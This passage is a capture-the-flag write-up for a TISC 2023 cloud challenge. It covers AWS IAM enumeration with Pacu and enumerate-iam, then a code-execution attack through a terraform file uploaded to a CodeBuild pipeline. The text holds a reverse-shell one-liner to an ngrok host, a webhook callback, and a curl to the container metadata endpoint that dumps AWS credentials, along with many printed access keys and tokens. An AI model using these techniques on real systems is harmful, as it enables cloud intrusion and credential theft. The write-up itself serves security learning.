@@ -922,3 +922,739 @@ Cookie: PHPSESSID=d7qeso6h5feg15tpmcnn5pu8e8; rank=0 union select flag,66,77,88 
 TISC{Y0u_4rE_7h3_CH0s3n_0nE}
 ```
 
+
+# Level 7B: DevSecMeow
+
+> Palindrome has accidentally exposed one of their onboarding guide! Sneak in as a new developer and exfiltrate any meaningful intelligence on their production system.
+
+[https://d3mg5a7c6anwbv.cloudfront.net/](https://d3mg5a7c6anwbv.cloudfront.net/)
+
+Note: Concatenate flag1 and flag2 to form the flag for submission.
+> 
+
+Initially I had decided against making writeups for this challenge as I had only gotten a partial solve, but decided to revisit this as I felt I learnt some new things along the way, as I came into the cloud challenge with absolutely no knowledge of cloud pentesting.
+
+Upon visiting the challenge, we would be presented with images of cute cats, such as these: (surprisingly i had saved only the images of the cats, but not the landing page of the challenge, hahaha)
+
+![lvl-7-1](img/lvl-7-1.png)
+
+Very cute!! This was probably the highlight of the challenge.
+
+We were presented with two links, one to request for AWS credentials, and another at `<REDACTED>.execute-api.ap-southeast-1.amazonaws.com/development/generate`
+ which which generated and provided us with two sets of links, one which was for CSR and another for CRT. The format of the link was as follows, which is also a signed URL. This provides us with limited access to the `devsecmeow2023certs` bucket.
+
+```python
+https://devsecmeow2023certs.s3.amazonaws.com/1695560718-12bc197ddac04bc2aba563ccdc2300ed/client.csr?AWSAccessKeyId=ASIATMLSTF3N2DCCYAPO&Signature=DUqCVI8Y7z5fH0ZccG2CywmDHNU%3D&x-amz-security-token=IQoJb3JpZ2luX2VjEE0aDmFwLXNvdXRoZWFzdC0xIkgwRgIhAJWNq42tkXix8kp3jvoIGNNOHFOql%2Bp17kJ8YRqKOEtzAiEA7sz%2FYcczE8ZGHSx7%2BrKib%2BVoFOZK0ToJUGrtdAGGn0gqkAMIRhAAGgwyMzI3MDU0Mzc0MDMiDPgdsASFLPDTPMBY8SrtAtvL8W1VAwmkgoHg6e5vloRu13JuaNo4Fc90rEyXyYo0orkqfgIRnOZVfkjE7fBMtg2%2Bhu3IDSxVRUvKY58QwYG76Yv6GRuu7b3r%2BM7nfZQREdXN0CMSQllF7jyKXJ%2BX2P3lZnbG9sBoco6ElFczbpsh2VmHiqS%2BmH9P08NBOeU%2FqIaXoXSGtyQfLFbx5ieDl9N%2F6rU6XygPaQLlFggQCEhn9k%2FMoICdPe7WyTT%2BBGxypQxcsWcGjP%2FSWxdPXQRUdEbzQp8W%2F8RPQIPpVxeWNBxlg3tKQvrWersLrsBvW1zlSQQ83wLlATgoCO%2BO0oX5odzk9%2FaCEhatgdWZBC9iAfdOWaVMXuPh%2Fj6Zp72VHpGgDk1%2FgxU6YR9BgR7GERrPMiy82qf3KrjPvbwnojcK4XNpsu11zfXH3kzQn7HJ2Dg7%2BjNfxcSV%2BKqZtKPZaSP2WA6WvgGW3PRYtFcyt4UmheCzA3xi1PG%2Bavln7kWwMMLhwKgGOpwBzIFtk6B4QZbvTueJsSdISW4D2rBdhu2LlHVeoPvwE6ILocNE1vAP2YvfuCLREvyImH19mRhh2Eldi41b%2B%2Bs0mKt3g4yjW5wag8PRjChiEUELhXpeibGNIEUMlscLH4FmSX%2Bj2a2iKBWXw77ttcfxNm0rdJBWBVVRWIk7w%2BRfqOe%2F%2BlhqtPPzXF1p3CWzxYHa%2Br4pY8gNfmlYKQ07&Expires=1695561318
+```
+
+I tried probing around the links, and the only allowed methods was `PUT` for the CSR and `GET` for the CRT links. After researching a bit more about MTLS, I figured that we had to generate our own CSR to be signed by the server’s CA, then download the CRT from the server. Won’t go into too much detail, but here’s how you would authenticate to the server:
+
+First generate the keys and the CSR, then upload it to the bucket:
+
+```python
+openssl genpkey -algorithm RSA -out client.key
+openssl req -new -key client.key -out client.csr
+
+curl -v --upload-file client.csr 'CSR LINK'
+curl 'CSR LINK' > client.crt
+```
+
+Afterwards, we would be able to download the signed CRT. Authenticating to the endpoint, we would be presented with a set of temporary credentials.
+
+```python
+┌──(wayell㉿wayell)-[~/Desktop/CTF/2023/TISC2023/7]
+└─$ curl https://13.213.29.24/ --cert client.crt --key client.key --insecure
+{"Message": "Hello new agent, use the credentials wisely! It should be live for the next 120 minutes! Our antivirus will wipe them out and the associated resources after the expected time usage.", "Access_Key": "AKIATMLSTF3NXDVUDADH", "Secret_Key": "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"}
+```
+
+> some stuff like the agent-id may not always fully match up, as i did the enumeration over multiple sessions - in fact, most of this challenge was just spent on enumeration, trying to piece together different information to exploit!
+> 
+
+Enumerating the permissions on our user, we only had access certain AWS commands.
+
+`aws iam get-policy-version --policy-arn arn:aws:iam::232705437403:policy/agent-0ce1537e40e446d28cfa909c95e9057d --version-id v1`
+
+Some interesting things to note is that we had access to codebuild, codepipeline, and our user has `PutObject` permission on the `devsecmeow2023zip` bucket. 
+
+```python
+{
+    "PolicyVersion": {
+        "Document": {
+            "Version": "2012-10-17",
+            "Statement": [
+                {
+                    "Sid": "VisualEditor0",
+                    "Effect": "Allow",
+                    "Action": [
+                        "iam:GetPolicy",
+                        "ssm:DescribeParameters",
+                        "iam:GetPolicyVersion",
+                        "iam:List*Policies",
+                        "iam:Get*Policy",
+                        "kms:ListKeys",
+                        "events:ListRules",
+                        "events:DescribeRule",
+                        "kms:GetKeyPolicy",
+                        "codepipeline:ListPipelines",
+                        "codebuild:ListProjects",
+                        "iam:ListRoles",
+                        "codebuild:BatchGetProjects"
+                    ],
+                    "Resource": "*"
+                },
+                {
+                    "Sid": "VisualEditor2",
+                    "Effect": "Allow",
+                    "Action": [
+                        "iam:ListAttachedUserPolicies"
+                    ],
+                    "Resource": "arn:aws:iam::232705437403:user/${aws:username}"
+                },
+                {
+                    "Sid": "VisualEditor3",
+                    "Effect": "Allow",
+                    "Action": [
+                        "codepipeline:GetPipeline"
+                    ],
+                    "Resource": "arn:aws:codepipeline:ap-southeast-1:232705437403:devsecmeow-pipeline"
+                },
+                {
+                    "Sid": "VisualEditor4",
+                    "Effect": "Allow",
+                    "Action": [
+                        "s3:PutObject"
+                    ],
+                    "Resource": "arn:aws:s3:::devsecmeow2023zip/*"
+                }
+            ]
+        },
+        "VersionId": "v1",
+        "IsDefaultVersion": true,
+        "CreateDate": "2023-09-26T01:44:37+00:00"
+    }
+}
+```
+
+Alternatively, we could have also used enumerate-iam, as it would brute force every single permission to check if it could be run by our current user. This would be useful if we didn’t have iam permissions to list our permissions or get our own policy.
+
+```jsx
+┌──(wayell㉿wayell)-[~/Desktop/CTF/2023/TISC2023/7]
+└─$ ./enumerate-iam.py --access-key 'AKIATMLSTF3NXDVUDADH' --secret-key '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' --region 'ap-southeast-1'
+2023-09-24 20:25:28,239 - 1203636 - [INFO] Starting permission enumeration for access-key-id "AKIATMLSTF3NXDVUDADH"
+2023-09-24 20:25:31,274 - 1203636 - [INFO] -- Account ARN : arn:aws:iam::232705437403:user/agent-ede94254222a4091b6322e748f365955
+2023-09-24 20:25:31,274 - 1203636 - [INFO] -- Account Id  : 232705437403
+2023-09-24 20:25:31,274 - 1203636 - [INFO] -- Account Path: user/agent-ede94254222a4091b6322e748f365955
+2023-09-24 20:25:31,793 - 1203636 - [INFO] Attempting common-service describe / list brute force.
+2023-09-24 20:25:34,887 - 1203636 - [INFO] -- codepipeline.list_pipelines() worked!
+2023-09-24 20:25:35,217 - 1203636 - [INFO] -- sts.get_caller_identity() worked!
+2023-09-24 20:25:35,363 - 1203636 - [INFO] -- iam.list_roles() worked!
+2023-09-24 20:25:35,477 - 1203636 - [INFO] -- events.list_rules() worked!
+2023-09-24 20:25:35,573 - 1203636 - [INFO] -- sts.get_session_token() worked!
+2023-09-24 20:25:36,440 - 1203636 - [INFO] -- codebuild.list_projects() worked!
+2023-09-24 20:25:40,519 - 1203636 - [INFO] -- iam.list_policies() worked!
+2023-09-24 20:25:45,253 - 1203636 - [INFO] -- dynamodb.describe_endpoints() worked!
+2023-09-24 20:25:52,014 - 1203636 - [INFO] -- kms.list_keys() worked!
+```
+
+There is an existing codebuild project. I used both aws commands as well as Pacu for the bulk of my enumeration
+
+`aws codebuild list-projects`
+
+```python
+{
+    "projects": [
+        "devsecmeow-build"
+    ]
+}
+```
+
+output from Pacu also shows more information about the `devsecmeow-build` project. (which alternatively we could have gotten from doing `aws get-batch-projects` since our policy allowed for the `codebuild:BatchGetProjects` permission).
+
+- from here, we can see the codepipeline:
+    - which would just download terraform and run `terraform init` and `terraform plan`
+    - this opens up the possibility of us putting in our own terraform configuration files, which would be run by the pipeline
+- at the same time, we can see that flag1 is stored as an environmental variable.
+
+```python
+CodeBuild: {
+    "EnvironmentVariables": [
+        {
+            "name": "flag1",
+            "value": "/devsecmeow/build/password",
+            "type": "PARAMETER_STORE"
+        }
+    ],
+    "Projects": [
+        {
+            "name": "devsecmeow-build",
+            "arn": "arn:aws:codebuild:ap-southeast-1:232705437403:project/devsecmeow-build",
+            "source": {
+                "type": "CODEPIPELINE",
+                "buildspec": "version: 0.2\n\nphases:\n  build:\n    commands:\n      - env\n      - cd /usr/bin\n      - curl -s -qL -o terraform.zip https://releases.hashicorp.com/terraform/1.4.6/terraform_1.4.6_linux_amd64.zip\n      - unzip -o terraform.zip\n      - cd \"$CODEBUILD_SRC_DIR\"\n      - ls -la \n      - terraform init \n      - terraform plan\n"
+            },
+            "artifacts": {
+                "type": "CODEPIPELINE",
+                "name": "devsecmeow-build",
+                "packaging": "NONE"
+            },
+            "cache": {
+                "type": "NO_CACHE"
+            },
+            "environment": {
+                "type": "LINUX_CONTAINER",
+                "image": "aws/codebuild/amazonlinux2-x86_64-standard:5.0",
+                "computeType": "BUILD_GENERAL1_SMALL",
+                "environmentVariables": [
+                    {
+                        "name": "flag1",
+                        "value": "/devsecmeow/build/password",
+                        "type": "PARAMETER_STORE"
+                    }
+                ],
+                "imagePullCredentialsType": "CODEBUILD"
+            },
+            "serviceRole": "arn:aws:iam::232705437403:role/codebuild-role",
+            "timeoutInMinutes": 15,
+            "queuedTimeoutInMinutes": 480,
+            "encryptionKey": "arn:aws:kms:ap-southeast-1:232705437403:alias/aws/s3",
+            "created": "Fri, 21 Jul 2023 11:05:13",
+            "lastModified": "Fri, 21 Jul 2023 11:05:13",
+            "logsConfig": {
+                "cloudWatchLogs": {
+                    "status": "ENABLED",
+                    "groupName": "devsecmeow-codebuild-logs",
+                    "streamName": "log-stream"
+                },
+                "s3Logs": {
+                    "status": "DISABLED"
+                }
+            },
+            "projectVisibility": "PRIVATE"
+        }
+    ]
+}
+```
+
+Enumerating further, we would actually find an event rule which would trigger this pipeline.
+
+`aws codepipeline list-pipelines`
+
+```python
+{
+    "pipelines": [
+        {
+            "name": "devsecmeow-pipeline",
+            "version": 1,
+            "created": "2023-07-21T11:05:14.065000-04:00",
+            "updated": "2023-07-21T11:05:14.065000-04:00"
+        }
+    ]
+}
+```
+
+Looking at the rule, it would be triggered once we upload a `rawr.zip` to the `devsecmeow2023zip` bucket.
+
+`aws events list-rules`
+
+```python
+{
+    "Rules": [
+        {
+            "Name": "cleaner_invocation_rule",
+            "Arn": "arn:aws:events:ap-southeast-1:232705437403:rule/cleaner_invocation_rule",
+            "State": "ENABLED",
+            "Description": "Scheduled resource cleaning",
+            "ScheduleExpression": "rate(15 minutes)",
+            "EventBusName": "default"
+        },
+        {
+            "Name": "codepipeline-trigger-rule",
+            "Arn": "arn:aws:events:ap-southeast-1:232705437403:rule/codepipeline-trigger-rule",
+            "EventPattern": "{\"detail\":{\"eventName\":[\"PutObject\",\"CompleteMultipartUpload\",\"CopyObject\"],\"eventSource\":[\"s3.amazonaws.com\"],\"requestParameters\":{\"bucketName\":[\"devsecmeow2023zip\"],\"key\":[\"rawr.zip\"]}},\"detail-type\":[\"AWS API Call via CloudTrail\"],\"source\":[\"aws.s3\"]}",
+            "State": "ENABLED",
+            "Description": "Amazon CloudWatch Events rule to automatically start your pipeline when a change occurs in the Amazon S3 object key or S3 folder. Deleting this may prevent changes from being detected in that pipeline. Read more: http://docs.aws.amazon.com/codepipeline/latest/userguide/pipelines-about-starting.html",
+            "EventBusName": "default"
+        }
+    ]
+}
+```
+
+At this point I had pretty much the rough direction on how i should be able to get to flag1. I had to trigger the codepipeline and get it to run my own terraform configuration in `rawr.zip`!
+
+We can upload to the bucket with the following:
+
+```python
+Pacu (c:AKIATMLSTF3N646244GK) > aws s3 cp rawr.zip s3://devsecmeow2023zip/rawr.zip
+upload: ./rawr.zip to s3://devsecmeow2023zip/rawr.zip
+```
+
+After researching further on terraform’s syntax, and possible ways to exec commands. I found that i could actually get a request back to my webhook with the following:
+
+`main.tf`
+
+```python
+data "external" "example" {
+  program = ["sh", "-c", "curl https://webhook.site/52ea86ca-ad8c-40fb-bd20-23bbbd2c2696"]
+}
+```
+
+![lvl-7-2](img/lvl-7-2.png)
+
+With this, it confirms that we can get RCE. All that was left was to spin up ngrok and get a connection via a reverse shell.
+
+`main.tf`
+
+```python
+data "external" "example" {
+  program = ["sh", "-c", "sh -i >& /dev/tcp/0.tcp.ap.ngrok.io/11553 0>&1"]
+}
+```
+
+After uploading the file to trigger the pipeline, we get a connection back.
+
+```python
+┌──(wayell㉿wayell)-[~/Desktop/CTF/2023/TISC2023/7]
+└─$ rlwrap nc -lvnp 5544
+listening on [any] 5544 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 50318
+sh: cannot set terminal process group (1): Inappropriate ioctl for device
+sh: no job control in this shell
+sh-5.2# whoami
+whoami
+root
+```
+
+Listing the environmental variables, we get the first part of the flag: `flag1=TISC{pr0tecT_`
+
+```python
+sh-5.2# env
+env
+MAVEN_DOWNLOAD_SHA512=900bdeeeae550d2d2b3920fe0e00e41b0069f32c019d566465015bdd1b3866395cbe016e22d95d25d51d3a5e614af2c83ec9b282d73309f644859bbad08b63db
+NUGET_XMLDOC_MODE=skip
+DOCKER_VERSION=23.0.6
+RBENV_SRC_DIR=/usr/local/rbenv
+CODEBUILD_INITIATOR=codepipeline/devsecmeow-pipeline
+AWS_EXECUTION_ENV=AWS_ECS_EC2
+JDK_HOME=/usr/lib/jvm/java-17-amazon-corretto.x86_64
+CODEBUILD_SRC_DIR=/codebuild/output/src436416888/src
+AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/b5450488-fe22-4393-99bf-cdf70197c9b2
+HOSTNAME=d7d5ed54cc12
+JRE_17_HOME=/usr/lib/jvm/java-17-amazon-corretto.x86_64
+JAVA_HOME=/usr/lib/jvm/java-17-amazon-corretto.x86_64
+DOTNET_ROOT=/root/.dotnet
+JRE_HOME=/usr/lib/jvm/java-17-amazon-corretto.x86_64
+GRADLE_PATH=/gradle
+JAVA_17_HOME=/usr/lib/jvm/java-17-amazon-corretto.x86_64
+POWERSHELL_DOWNLOAD_SHA=E85D5544E13A924F8B2C4A5DC2D43ABE46E46633F89E8D138D39C0AAEACB9976
+GITVERSION_VERSION=5.12.0
+AWS_DEFAULT_REGION=ap-southeast-1
+DOCKER_BUILDX_VERSION=0.11.0
+AWS_REGION=ap-southeast-1
+PLUGIN_MAX_PORT=25000
+CODEBUILD_BUILD_IMAGE=aws/codebuild/amazonlinux2-x86_64-standard:5.0
+PWD=/codebuild/output/src436416888/src
+ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/1948866c-4f5c-40da-a145-4338e5e2bf73
+CODEBUILD_KMS_KEY_ID=arn:aws:kms:ap-southeast-1:232705437403:alias/aws/s3
+CODEBUILD_GOPATH=/codebuild/output/src436416888
+N_SRC_DIR=/n
+JDK_17_HOME=/usr/lib/jvm/java-17-amazon-corretto.x86_64
+POWERSHELL_VERSION=7.3.4
+CODEBUILD_ACTION_RUNNER_URL=https://codefactory-ap-southeast-1-prod-default-build-agent-executor.s3.ap-southeast-1.amazonaws.com/cawsrunner.zip
+CODEBUILD_PROJECT_UUID=5be95a1e-7b67-4676-806e-1e573ff14d9e
+MAVEN_VERSION=3.9.2
+PHP_82_VERSION=8.2.7
+CODEBUILD_BUILD_ID=devsecmeow-build:3d7d4283-d5b3-43c2-8474-8e732bddf7df
+HOME=/root
+CODEBUILD_CI=true
+GRADLE_VERSION=8.1.1
+DOCKER_CHANNEL=stable
+RUBY_32_VERSION=3.2.2
+PLUGIN_MIN_PORT=10000
+CODEBUILD_RESOLVED_SOURCE_VERSION=I1F18dvJ4SPx74WfQA9hOszHHAn2e2U8
+CODEBUILD_AGENT_ENDPOINT=http://127.0.0.1:7831
+CODEBUILD_LAST_EXIT=0
+GRADLE_DOWNLOADS_SHA256=5625a0ae20fe000d9225d000b36909c7a0e0e8dda61c19b12da769add847c975 8.1.1
+CODEBUILD_BUILD_ARN=arn:aws:codebuild:ap-southeast-1:232705437403:build/devsecmeow-build:3d7d4283-d5b3-43c2-8474-8e732bddf7df
+PLUGIN_CLIENT_CERT=-----BEGIN CERTIFICATE-----
+MIICTzCCAbGgAwIBAgIRAPsKhL7EsdvTAq6LmbDwM9owCgYIKoZIzj0EAwQwKDES
+MBAGA1UEChMJSGFzaGlDb3JwMRIwEAYDVQQDEwlsb2NhbGhvc3QwIBcNMjMwOTI2
+MDcyMTE5WhgPMjA1MzA5MjUxOTIxNDlaMCgxEjAQBgNVBAoTCUhhc2hpQ29ycDES
+MBAGA1UEAxMJbG9jYWxob3N0MIGbMBAGByqGSM49AgEGBSuBBAAjA4GGAAQAqWpG
+qM6TT6UFEZT5m/6o9pG1krMiElCGxm5UjAeQuNb2wkP6pfvYydwEQNgrLNVqKsXt
+H3B0p7/yJguC4sImmZEA8oo06wG/GaKc7JlusTg+Z44S55y9V0ENguWoHePr2Yam
+5cboubuwh8n6mFdEOcrkUHTY9WjF5Q1yKw1+BrxnTBqjdzB1MA4GA1UdDwEB/wQE
+AwICrDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDwYDVR0TAQH/BAUw
+AwEB/zAdBgNVHQ4EFgQUjdjvsNJ38R+kEvbxbA1GZ+NNg+swFAYDVR0RBA0wC4IJ
+bG9jYWxob3N0MAoGCCqGSM49BAMEA4GLADCBhwJBdIs+MSGiYv+PaVM4OrpZCcwn
+V0SmtV4tQ7mfopcVj+2PTYzm/uEVk0xq0fHXFTIXenn6ca8h8aI9LY1pLvPLHukC
+QgFVjg73x1QIAS/iUXFWZFU4wYcW0uyvUnR6+Gm2kjEH5Z3LfFuT6zQnE9Ws2OGC
+37hHeSx1e3rxCRD4aS34CgFTVw==
+-----END CERTIFICATE-----
+
+ANT_DOWNLOAD_SHA512=de4ac604629e39a86a306f0541adb3775596909ad92feb8b7de759b1b286417db24f557228737c8b902d6abf722d2ce5bb0c3baa3640cbeec3481e15ab1958c9
+ANT_VERSION=1.10.13
+PLUGIN_PROTOCOL_VERSIONS=6,5
+PYTHON_311_VERSION=3.11.4
+flag1=TISC{pr0tecT_
+DOCKER_SHA256=544262F4A3621222AFB79960BFAD4D486935DAB80893478B5CC9CF8EBAF409AE
+PYYAML_VERSION=5.4.1
+CODEBUILD_BUILD_NUMBER=605
+DOCKER_COMPOSE_VERSION=2.17.3
+ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/1948866c-4f5c-40da-a145-4338e5e2bf73
+MAVEN_HOME=/opt/maven
+SHLVL=4
+GOENV_DISABLE_GOPATH=1
+CODEBUILD_LOG_PATH=log-stream/3d7d4283-d5b3-43c2-8474-8e732bddf7df
+PYTHON_PIP_VERSION=23.1.2
+SBT_VERSION=1.8.3
+CODEBUILD_EXECUTION_ROLE_BUILD=
+CODEBUILD_SOURCE_VERSION=arn:aws:s3:::devsecmeow2023zip/devsecmeow-pipeline/source_out/XqDUDFw.zip
+CODEBUILD_BUILD_URL=https://ap-southeast-1.console.aws.amazon.com/codebuild/home?region=ap-southeast-1#/builds/devsecmeow-build:3d7d4283-d5b3-43c2-8474-8e732bddf7df/view/new
+CODEBUILD_FE_REPORT_ENDPOINT=https://codebuild.ap-southeast-1.amazonaws.com/
+DIND_COMMIT=3b5fac462d21ca164b3778647420016315289034
+CODEBUILD_BUILD_SUCCEEDING=1
+CODEBUILD_BMR_URL=https://CODEBUILD_AGENT:3000
+CODEBUILD_AUTH_TOKEN=f89614b9-93c7-451e-8724-7a8c3e28978e
+MAVEN_OPTS=-Dmaven.wagon.httpconnectionManager.maxPerRoute=2
+RUBY_BUILD_SRC_DIR=/usr/local/rbenv/plugins/ruby-build
+DOTNET_60_SDK_VERSION=6.0.410
+NODE_18_VERSION=18.16.0
+PATH=/usr/local/bin/sbt/bin:/root/.goenv/shims:/root/.goenv/bin:/go/bin:/root/.phpenv/shims:/root/.phpenv/bin:/root/.pyenv/shims:/root/.pyenv/bin:/root/.rbenv/shims:/usr/local/rbenv/bin:/usr/local/rbenv/shims:/root/.dotnet/:/root/.dotnet/tools/:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/codebuild/user/bin
+CODEBUILD_CONTAINER_NAME=default
+DOCKER_BUCKET=download.docker.com
+POWERSHELL_DOWNLOAD_URL=https://github.com/PowerShell/PowerShell/releases/download/v7.3.4/powershell-7.3.4-linux-x64.tar.gz
+CODEBUILD_START_TIME=1695712891548
+GOLANG_20_VERSION=1.20.5
+TF_PLUGIN_MAGIC_COOKIE=d602bf8f470bc67ca7faa0386276bbdd4330efaf76d1a219cb4d6991ca9872b2
+SBT_DOWNLOAD_SHA256=21F4210786FD68FD15DCA3F4C8EE9CAE0DB249C54E1B0EF6E829E9FA4936423A
+OLDPWD=/usr/bin
+GOPATH=/go:/codebuild/output/src436416888
+_=/usr/bin/env
+```
+
+From here, we have actually privilege escalated to the codebuild user. We can even further enumerate the system and get extract AWS credentials as we are in the codebuild container.
+
+The below screenshot is from [https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-privilege-escalation/aws-codebuild-privesc](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-privilege-escalation/aws-codebuild-privesc)
+
+![lvl-7-3](img/lvl-7-3.png)
+
+We can get credentials from the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI. With the credentials, we can do further enumeration.
+
+```python
+cat /codebuild/output/tmp/env.sh
+<this would give you all the env vars>
+sh-5.2# curl http://169.254.170.2/v2/credentials/6c74c19d-2b24-46a0-b63f-fdfb00e99544
+<v2/credentials/6c74c19d-2b24-46a0-b63f-fdfb00e99544
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1511  100  1511    0     0  2126k      0 --:--:-- --:--:-- --:--:-- 1475k
+{"RoleArn":"AQICAHiXeu3bIBb9heJmFtHPbcbrxVOOY2z+gbh/ZektV0KIkAH3Ds62SaqpjUhKi3msbE1IAAABATCB/gYJKoZIhvcNAQcGoIHwMIHtAgEAMIHnBgkqhkiG9w0BBwEwHgYJYIZIAWUDBAEuMBEEDBqB67vFkp9wW0h50QIBEICBuY2RElK62fRf62mp7/ZJDTa89kfVKgl/agsEvKqEHmrLWSPMXXhNOwNw+D18G2mtXeDgXsmbzXXo4m6b6t2uz2IoMUnFqDnRwnTWf4LCOsVgo4JbzHqcW9yAIIktEHrgoS5G/tjLrjpFDBJXaBXiVomEcQU7TtO6ikdQZ+hkSOqHFDfDV3nrfryWAj50xxIjcRAtU7q79/eua8H9/2Nsj/QfIZRacJ7cCGj7NM4yRlhWsvdUY9eGwxun","AccessKeyId":"ASIATMLSTF3N6UAUM3M4","SecretAccessKey":"ien1ynuZlqfMvyftNHkCkACSGRBm3NEpvGj4dzU5","Token":"IQoJb3JpZ2luX2VjEHgaDmFwLXNvdXRoZWFzdC0xIkcwRQIhAN3HHwBjM/eJMi+iJ1mt4GYMfFO9xx8oF+Uv5CuUJ6sdAiAD9isp2Q4Ohk/oGjQyQ2MSrPq7/AfQAaNRpLfCy42zsCq1AwhxEAAaDDIzMjcwNTQzNzQwMyIMt5SI6IPOIzefWJTlKpIDMZC53lBrKS+yiiUhiEfFdfap64I0NdXjPosOFdhOoON05/3mIdG7qOjNQ8Gg1j5pmZAVIQpqzfB2oWqbQh4p36PtVq+UUq9d8c6tFEopzHsXvk5VC1ggZiw/cuI2hjl6xwEwQ9aFJ/fEuxOjBHyosQ544x//NgcoBdqJCAko0TSrngr/E10mBPbm/z2bS/r2rOf9Qv3Bxbldw4pMjjxRVGL2XQz37ulAO6zIOlvkvEyNOGU3ytEe5MCTiZYjECKjehV72jOM7xBIgjRRO/CQQ6C/5c+5tsrzhzDnWMBd/ISfTKMO929umxGNfK2X5Y+hrNYequmM5k+qRe4ET5FuB+NHz/w76NXqGFK3hP0VvProXP/QUuc9C8tN4yII2Ntu9FMh2VN5Vnq9/M7OiRowkCswCKi8mIaQp7EITURCTXMYVV/81xwXnOzPwGPwz3RqHRNAiosNPyXYtoVZlDevoXHnjzg5nurKEnR5MiV7AVjQwDltUAOQ8DByU6nuKRShi5wOeq3hNNsQBTgVoWhyyMgKMLCYyqgGOpMBD6ZxMFNMbbWZ220qzvalu+DTc4wgbMc5C+1cP6ENoRaopRi0NFjQUAWUqOe4eYnhPE9iSjwVfwcPQUdB73OOhcCOHmFkTq191CiE1B62xg/gWNbQ24Is7tR5RRJmy4z2tf159X1YtLHv3p53qGBoMxHni2Y1/cz5MINrwkm2ld/duco/QBlRGYDKWd311yZOd0f4","Expiration":"2023-09-26T08:45:52Z"}
+```
+
+From Pacu we actually can note that there were two EC2 instances:
+
+- 13.213.29.24: this was most definitely the staging system, as we came from here
+- 54.255.155.134: this is likely the production system which we had to escalate to
+
+```python
+Pacu (codebuild-a:No Keys Set) > data
+
+Session data:
+aws_keys: [
+    <AWSKey: None>
+]
+id: 4
+created: "2023-09-26 07:47:29.851108"
+is_active: true
+name: "codebuild-a"
+boto_user_agent: "aws-cli/1.16.190 Python/3.7.0 Windows/10 botocore/1.12.180"
+access_key_id: "ASIATMLSTF3N6UAUM3M4"
+secret_access_key: "******" (Censored)
+session_token: "IQoJb3JpZ2luX2VjEHgaDmFwLXNvdXRoZWFzdC0xIkcwRQIhAN3HHwBjM/eJMi+iJ1mt4GYMfFO9xx8oF+Uv5CuUJ6sdAiAD9isp2Q4Ohk/oGjQyQ2MSrPq7/AfQAaNRpLfCy42zsCq1AwhxEAAaDDIzMjcwNTQzNzQwMyIMt5SI6IPOIzefWJTlKpIDMZC53lBrKS+yiiUhiEfFdfap64I0NdXjPosOFdhOoON05/3mIdG7qOjNQ8Gg1j5pmZAVIQpqzfB2oWqbQh4p36PtVq+UUq9d8c6tFEopzHsXvk5VC1ggZiw/cuI2hjl6xwEwQ9aFJ/fEuxOjBHyosQ544x//NgcoBdqJCAko0TSrngr/E10mBPbm/z2bS/r2rOf9Qv3Bxbldw4pMjjxRVGL2XQz37ulAO6zIOlvkvEyNOGU3ytEe5MCTiZYjECKjehV72jOM7xBIgjRRO/CQQ6C/5c+5tsrzhzDnWMBd/ISfTKMO929umxGNfK2X5Y+hrNYequmM5k+qRe4ET5FuB+NHz/w76NXqGFK3hP0VvProXP/QUuc9C8tN4yII2Ntu9FMh2VN5Vnq9/M7OiRowkCswCKi8mIaQp7EITURCTXMYVV/81xwXnOzPwGPwz3RqHRNAiosNPyXYtoVZlDevoXHnjzg5nurKEnR5MiV7AVjQwDltUAOQ8DByU6nuKRShi5wOeq3hNNsQBTgVoWhyyMgKMLCYyqgGOpMBD6ZxMFNMbbWZ220qzvalu+DTc4wgbMc5C+1cP6ENoRaopRi0NFjQUAWUqOe4eYnhPE9iSjwVfwcPQUdB73OOhcCOHmFkTq191CiE1B62xg/gWNbQ24Is7tR5RRJmy4z2tf159X1YtLHv3p53qGBoMxHni2Y1/cz5MINrwkm2ld/duco/QBlRGYDKWd311yZOd0f4"
+session_regions: [
+    "ap-southeast-1"
+]
+EC2: {
+    "Instances": [
+        {
+            "ImageId": "ami-0df7a207adb9748c7",
+            "InstanceId": "i-02602bf0cf92a4ee1",
+            "InstanceType": "t3a.small",
+            "LaunchTime": "Mon, 31 Jul 2023 14:50:12",
+            "Monitoring": {
+                "State": "disabled"
+            },
+            "Placement": {
+                "AvailabilityZone": "ap-southeast-1a",
+                "Tenancy": "default"
+            },
+            "PrivateDnsName": "ip-192-168-0-112.ap-southeast-1.compute.internal",
+            "PrivateIpAddress": "192.168.0.112",
+            "PublicDnsName": "ec2-54-255-155-134.ap-southeast-1.compute.amazonaws.com",
+            "PublicIpAddress": "54.255.155.134",
+            "State": {
+                "Code": 16,
+                "Name": "running"
+            },
+            "SubnetId": "subnet-0e7baa8cdf3a7fd1b",
+            "VpcId": "vpc-063e577d022d3fa3b",
+            "Architecture": "x86_64",
+            "BlockDeviceMappings": [
+                {
+                    "DeviceName": "/dev/sda1",
+                    "Ebs": {
+                        "AttachTime": "Fri, 21 Jul 2023 15:05:29",
+                        "DeleteOnTermination": true,
+                        "Status": "attached",
+                        "VolumeId": "vol-059ce4b405612f51a"
+                    }
+                }
+            ],
+            "ClientToken": "terraform-20230721150528288200000009",
+            "EnaSupport": true,
+            "Hypervisor": "xen",
+            "IamInstanceProfile": {
+                "Arn": "arn:aws:iam::232705437403:instance-profile/ec2_production",
+                "Id": "AIPATMLSTF3N6TTIJTATG"
+            },
+            "NetworkInterfaces": [
+                {
+                    "Association": {
+                        "IpOwnerId": "amazon",
+                        "PublicDnsName": "ec2-54-255-155-134.ap-southeast-1.compute.amazonaws.com",
+                        "PublicIp": "54.255.155.134"
+                    },
+                    "Attachment": {
+                        "AttachTime": "Fri, 21 Jul 2023 15:05:29",
+                        "AttachmentId": "eni-attach-0f142ca01d9f74be8",
+                        "DeleteOnTermination": true,
+                        "Status": "attached"
+                    },
+                    "Groups": [
+                        {
+                            "GroupName": "Generic network for staging and production",
+                            "GroupId": "sg-0c178b9e55483a8da"
+                        }
+                    ],
+                    "MacAddress": "02:83:9e:48:11:60",
